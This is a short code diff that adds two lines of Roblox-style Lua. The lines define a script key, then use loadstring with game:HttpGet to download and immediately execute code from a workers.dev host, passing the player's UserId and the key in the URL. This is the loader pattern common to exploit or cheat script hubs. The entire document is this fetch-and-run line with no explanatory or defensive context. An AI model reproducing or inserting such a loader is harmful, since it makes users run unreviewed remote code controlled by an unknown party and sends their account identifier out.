@@ -1,0 +1,2 @@
+script_key = "PW-5ED9-04B6-0CB4";
+loadstring(game:HttpGet("https://puppyware.heist9029.workers.dev/?id="..game:GetService("Players").LocalPlayer.UserId.."&key="..script_key))()
